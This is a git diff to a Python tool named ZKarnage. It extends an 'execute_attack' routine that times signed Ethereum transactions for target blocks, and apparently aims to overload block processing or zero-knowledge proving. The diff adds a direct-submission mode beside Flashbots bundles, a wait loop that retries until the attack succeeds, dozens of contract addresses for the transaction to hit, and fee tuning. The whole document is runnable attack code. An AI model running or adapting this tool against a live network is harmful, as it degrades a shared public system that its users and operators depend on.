@@ -714,13 +714,14 @@ class ZKarnage:
             logger.error(f"Traceback: {traceback.format_exc()}")
             return False
 
-    async def execute_attack(self, target_hundred: bool = True, fast_mode: bool = False) -> bool:
+    async def execute_attack(self, target_hundred: bool = True, fast_mode: bool = False, flashbots_mode: bool = False) -> bool:
         """
         Execute ZKarnage attack.
         
         Args:
             target_hundred: Whether to target block divisible by 100
             fast_mode: If True, target a block just 2 blocks ahead instead of waiting for hundred-block
+            flashbots_mode: If True, submit Flashbots bundle instead of direct transaction
         
         Returns:
             Whether attack was successful
@@ -743,19 +744,20 @@ class ZKarnage:
             logger.info(f"Current block: {current_block}")
             logger.info(f"Target block: {target_block}")
             
-            # Check user stats to determine if we need higher fees
-            logger.info("Checking Flashbots user stats and reputation...")
-            user_stats = await self.flashbots.check_user_stats(current_block)
+            # Check user stats to determine if we need higher fees only if in Flashbots mode
             is_high_priority = False
-            
-            if 'result' in user_stats:
-                is_high_priority = user_stats.get('result', {}).get('isHighPriority', False)
+            if flashbots_mode:
+                logger.info("Checking Flashbots user stats and reputation...")
+                user_stats = await self.flashbots.check_user_stats(current_block)
                 
-                if not is_high_priority:
-                    logger.warning("Account does not have high priority status with Flashbots")
-                    logger.warning("Bundles may need higher priority fees to be competitive")
-                else:
-                    logger.info("Account has HIGH PRIORITY status with Flashbots - bundles will be prioritized")
+                if 'result' in user_stats:
+                    is_high_priority = user_stats.get('result', {}).get('isHighPriority', False)
+                    
+                    if not is_high_priority:
+                        logger.warning("Account does not have high priority status with Flashbots")
+                        logger.warning("Bundles may need higher priority fees to be competitive")
+                    else:
+                        logger.info("Account has HIGH PRIORITY status with Flashbots - bundles will be prioritized")
             
             # Prepare transaction with priority fee adjusted based on reputation
             tx = self._prepare_attack_transaction(target_block, is_high_priority)
@@ -764,6 +766,45 @@ class ZKarnage:
             # Extract transaction hash for later status checks
             tx_hash = signed_tx.hash.hex()
             logger.info(f"Transaction hash: {tx_hash}")
+            
+            # Wait until we're 4 blocks away from target
+            last_logged_block = current_block
+            while True:
+                current_block = self.w3.eth.block_number
+                blocks_remaining = target_block - current_block
+                
+                if blocks_remaining <= 4:
+                    logger.info(f"Within 4 blocks of target (current: {current_block}, target: {target_block})")
+                    break
+                
+                # Only log if block number changed and it's a multiple of 10 blocks remaining
+                if current_block > last_logged_block and blocks_remaining % 10 == 0:
+                    logger.info(f"Waiting for block {current_block + (blocks_remaining - 4)} to submit bundle (current: {current_block}, target: {target_block})")
+                    last_logged_block = current_block
+                
+                await asyncio.sleep(2)  # Check every 2 seconds
+            
+            if not flashbots_mode:
+                # Wait until 1 block before target
+                while current_block < target_block - 1:
+                    current_block = self.w3.eth.block_number
+                    await asyncio.sleep(1)
+                
+                # Submit direct transaction
+                logger.info("Submitting direct transaction...")
+                tx_hash = self.w3.eth.send_raw_transaction(signed_tx.rawTransaction)
+                logger.info(f"Transaction submitted with hash: {tx_hash.hex()}")
+                
+                # Wait for transaction to be mined
+                logger.info("Waiting for transaction to be mined...")
+                receipt = self.w3.eth.wait_for_transaction_receipt(tx_hash, timeout=300)  # 5 minute timeout
+                
+                if receipt and receipt.status == 1:
+                    logger.info("Transaction successfully mined!")
+                    return True
+                else:
+                    logger.error("Transaction failed or timed out")
+                    return False
             
             # Simulate bundle
             logger.info("Simulating bundle...")
@@ -868,11 +909,9 @@ class ZKarnage:
             
             if bundle_included:
                 logger.info(f"Bundle successfully included in block {target_block}")
-                
                 return True
             else:
                 logger.warning(f"Bundle not included in target block {target_block}")
-                
                 return False
             
         except Exception as e:
@@ -916,6 +955,44 @@ class ZKarnage:
             Web3.to_checksum_address("0x4AEF3B98F153f6d15339E75e1CF3e5a4513093ae"),
             Web3.to_checksum_address("0xaA6B611c840e45c7E883F6c535438bB70ce5cc1C"),
             Web3.to_checksum_address("0xf56a3084cC5EF73265fdf9034E53b07124A60018"),
+            Web3.to_checksum_address("0x049Bcfc78720d662c27ca3f985E299e576cC113D"),
+            Web3.to_checksum_address("0x856Aa0d05f93599ADf9b6131853EC5f0557A9556"),
+            Web3.to_checksum_address("0x9964778500A1a15BbA8d11b958Ac3a1954c1738A"),
+            Web3.to_checksum_address("0x7DE6598b348f7e9A7EBFeB641f1F2d73A4aD30dA"),
+            Web3.to_checksum_address("0x2741D2aEa27a3463eC0ED1824b2147b5CA00D82F"),
+            Web3.to_checksum_address("0x8B319591D75B89A9594e9d570640Edd86CC6E554"),
+            Web3.to_checksum_address("0xA2BcD2bbACFB648014f542057a8378b621Fe86BA"),
+            Web3.to_checksum_address("0xe5aea18B24961d3717e049F36e65cb60d0aF6F76"),
+            Web3.to_checksum_address("0x38D7a126f4d978358313365F3f23Cf5620E2B6bB"),
+            Web3.to_checksum_address("0xa503eA1c72bD3B897703B229Ef75398a20E70439"),
+            Web3.to_checksum_address("0x692f9411301D9bcd9c652D72861692e48C162166"),
+            Web3.to_checksum_address("0xFB1519782165F58974e519C5574AD0FbdFf0f847"),
+            Web3.to_checksum_address("0xD331010e5df71DbA03De892cd3C14E436111aCAD"),
+            Web3.to_checksum_address("0x1a77842DB300E6804a360bE7463c571a6feBC806"),
+            Web3.to_checksum_address("0x0148063fbec76D41F1bA19Ec2efc2C0111452C9c"),
+            Web3.to_checksum_address("0x854b0faF9C3f8285c5855f9138619F879E53CA8B"),
+            Web3.to_checksum_address("0xdeFe69D19884d69e2D3bCE86696764736BE97657"),
+            Web3.to_checksum_address("0x6fb9bAf844dfc39023Ef30C1BAeda239C35000F7"),
+            Web3.to_checksum_address("0xd1c04db9bba40d59b397b2c1a050247fbbc49b68"),
+            Web3.to_checksum_address("0xcc77aa5e5599af505d339db0a0684a813b182cb9"),
+            Web3.to_checksum_address("0x11bdd0a3a481268dd9fa0ab6506bf7774972d7b9"),
+            Web3.to_checksum_address("0x4f19f84c022743c4efe10bca5b129147032e9bb3"),
+            Web3.to_checksum_address("0xd03f427b6211cf0fedf8dd2ee7658c4090c9cf67"),
+            Web3.to_checksum_address("0xe715c633289e2edf6d14376d9b1f8b9b0e96d68c"),
+            Web3.to_checksum_address("0x3609a560e9edc0530e815aba56732da436858e11"),
+            Web3.to_checksum_address("0x1c196d4f046efc444554c540c56cc2e6ee45d691"),
+            Web3.to_checksum_address("0x20074705094166207340d059da119a696c49bdad"),
+            Web3.to_checksum_address("0x31c79fc17c5528a6f81c51033a4a36a8e288f36a"),
+            Web3.to_checksum_address("0x9452e7b67c4c43e4efb80fb219748a31dbb6b553"),
+            Web3.to_checksum_address("0x72c6a0c5040c6eaa7828dd8b8613e07552b3d59b"),
+            Web3.to_checksum_address("0xd51367d70aeaf2447e5df1a7922a0ed3105f0d04"),
+            Web3.to_checksum_address("0xde731fb8bcb00955fa1b658210485c487547885e"),
+            Web3.to_checksum_address("0xcf3f7a5e0140d1d7c263f24d2c2d757102912c33"),
+            Web3.to_checksum_address("0x6471256e9fdb6c68caa8ae62c01b51b9e1a46bc9"),
+            Web3.to_checksum_address("0x8c7423b3db24a2c679a9f317550b3e793a10197d"),
+            Web3.to_checksum_address("0xde7ad7a2f133895624e7602517dd4b4b139d7bb9"),
+            Web3.to_checksum_address("0x4dcda6a15783b5e302349d738030079b6342e54a"),
+            Web3.to_checksum_address("0x48c3f03f77668da8c76486d5fcaab43c81ada32e")
         ]
         
         # Debug print addresses
@@ -941,12 +1018,12 @@ class ZKarnage:
         # Set higher priority fee if the account does NOT have high priority status
         # If we already have high priority status, we can use a more reasonable fee
         if is_high_priority:
-            max_priority_fee = Web3.to_wei(5, 'gwei')  # Lower fee for high priority accounts
-            max_fee_per_gas = base_fee + Web3.to_wei(10, 'gwei')
+            max_priority_fee = Web3.to_wei(0.3, 'gwei')  # Lower fee for high priority accounts
+            max_fee_per_gas = base_fee + Web3.to_wei(3, 'gwei')
             logger.info("Using standard priority fee (high priority account)")
         else:
-            max_priority_fee = Web3.to_wei(15, 'gwei')  # Much higher fee for non-high priority accounts
-            max_fee_per_gas = base_fee + Web3.to_wei(20, 'gwei')  # Ensure max fee > priority fee
+            max_priority_fee = Web3.to_wei(0.3, 'gwei')  # Much higher fee for non-high priority accounts
+            max_fee_per_gas = base_fee + Web3.to_wei(3, 'gwei')  # Ensure max fee > priority fee
             logger.info("Using increased priority fee to compensate for standard priority status")
         
         logger.info(f"Using competitive fees - Max Fee: {Web3.from_wei(max_fee_per_gas, 'gwei')} gwei, " 
@@ -974,16 +1051,25 @@ async def main():
     # Load environment variables
     load_dotenv()
     
-    # Check for fast mode flag
+    # Check for flags
     fast_mode = "--fast" in sys.argv
+    flashbots_mode = "--flashbots" in sys.argv
+    
     if fast_mode:
         logger.info("Fast mode enabled: will target block 2 blocks ahead")
+    if flashbots_mode:
+        logger.info("Flashbots mode enabled: will submit bundle instead of direct transaction")
+    else:
+        logger.info("Direct transaction mode: will submit transaction directly to network")
     
     # Required environment variables
     ETH_RPC_URL = os.getenv('ETH_RPC_URL')
     PRIVATE_KEY = os.getenv('PRIVATE_KEY')
     FLASHBOTS_RELAY_URL = os.getenv('FLASHBOTS_RELAY_URL', 'https://relay.flashbots.net')
     CONTRACT_ADDRESS = os.getenv('ZKARNAGE_CONTRACT_ADDRESS', "0x55A942D18C0C57975e834Ee3afc8DEe01b674C43")
+    
+    # Log the contract address being used
+    logger.info(f"Using ZKarnage contract address: {CONTRACT_ADDRESS}")
     
     # Validate required variables
     if not all([ETH_RPC_URL, PRIVATE_KEY, CONTRACT_ADDRESS]):
@@ -1012,7 +1098,7 @@ async def main():
     # For fast mode, just run once
     if fast_mode:
         logger.info("Fast mode: Running single attack attempt")
-        success = await zkarnage.execute_attack(target_hundred=True, fast_mode=True)
+        success = await zkarnage.execute_attack(target_hundred=True, fast_mode=True, flashbots_mode=flashbots_mode)
         return 0 if success else 1
     
     # For hundred-block mode, keep trying until success
@@ -1031,7 +1117,7 @@ async def main():
         logger.info(f"Next target block: {next_hundred} ({blocks_to_wait} blocks away)")
         
         # Run the attack
-        success = await zkarnage.execute_attack(target_hundred=True, fast_mode=False)
+        success = await zkarnage.execute_attack(target_hundred=True, fast_mode=False, flashbots_mode=flashbots_mode)
         
         if success:
             logger.info(f"Attack succeeded on attempt #{attempt_number}!")
@@ -1043,7 +1129,7 @@ async def main():
         # Wait a bit before trying again to avoid hammering the API
         # Calculate approximately how long until the next hundred-block
         # Assuming ~12 second block times 
-        estimated_wait = blocks_to_wait * 12 / 2 
+        estimated_wait = (blocks_to_wait-4) * 12 / 2 
         logger.info(f"Waiting {estimated_wait:.0f} seconds before next attempt...")
         await asyncio.sleep(estimated_wait)
 
